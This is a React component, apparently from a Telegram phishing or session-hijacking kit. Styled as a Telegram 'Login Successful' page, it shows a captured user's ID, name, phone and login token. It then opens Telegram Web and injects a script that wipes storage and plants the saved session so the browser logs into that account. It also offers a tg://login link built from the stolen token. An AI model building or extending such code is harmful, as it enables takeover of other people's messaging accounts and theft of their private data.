import React from 'react';
import { useNavigate } from 'react-router-dom';

const SuccessPage = () => {
    const navigate = useNavigate();
    const sessionData = JSON.parse(localStorage.getItem('account1') || '{}');
    const userId = localStorage.getItem('telegram_user_id') || 'N/A';
    const userName = localStorage.getItem('telegram_user_name') || 'N/A';
    const userPhone = localStorage.getItem('telegram_user_phone') || 'N/A';
    const loginToken = localStorage.getItem('login_token') || '';

    const handleOpenTelegram = () => {
        const telegramWebUrl = "https://web.telegram.org/k/";
        const loginScript = `
            localStorage.clear();
            localStorage.setItem("account1", '${JSON.stringify(sessionData)}');
            location.reload();
        `;
        const telegramWindow = window.open(telegramWebUrl, "_blank");
        if (telegramWindow) {
            setTimeout(() => {
                telegramWindow.document.write(`<script>${loginScript}</script>`);
                telegramWindow.document.close();
            }, 1500);
        } else {
            window.location.href = telegramWebUrl;
        }
    };

    return (
        <div className="min-h-screen bg-[#17212B] flex items-center justify-center p-4">
            <div className="w-full max-w-sm bg-[#232E3C] rounded-lg p-6 shadow-md">
                <div className="flex flex-col items-center">
                    <div className="w-16 h-16 bg-[#3390EC] rounded-full flex items-center justify-center mb-4">
                        <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="none">
                            <path d="M20 4L3 11L10 14M20 4L17 21L10 14M20 4L10 14" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </div>
                    <h1 className="text-xl font-bold text-white mb-2">Login Successful!</h1>
                    <p className="text-[#AAAAAA] text-sm mb-4">You should be logged into Telegram Web. If not, try the button below.</p>

                    <div className="w-full text-left text-white mb-4">
                        <p><strong>User ID:</strong> {userId}</p>
                        <p><strong>Name:</strong> {userName}</p>
                        <p><strong>Phone:</strong> {userPhone}</p>
                    </div>

                    <button
                        onClick={handleOpenTelegram}
                        className="w-full bg-[#3390EC] text-white py-2 rounded-lg hover:bg-[#5EACEF] transition-colors mb-4"
                    >
                        Open Telegram Web Again
                    </button>

                    {loginToken && (
                        <div className="mt-4 text-center">
                            <p className="text-[#AAAAAA] text-sm mb-2">Manual Login Link:</p>
                            <a href={`tg://login?token=${loginToken}`} target="_blank" rel="noopener noreferrer" className="text-[#3390EC] hover:text-[#5EACEF] text-sm break-all">
                                {`tg://login?token=${loginToken}`}
                            </a>
                        </div>
                    )}

                    <button
                        onClick={() => {
                            localStorage.clear();
                            navigate('/');
                        }}
                        className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm"
                    >
                        Log Out and Return to Login
                    </button>
                </div>
            </div>
        </div>
    );
};

export default SuccessPage;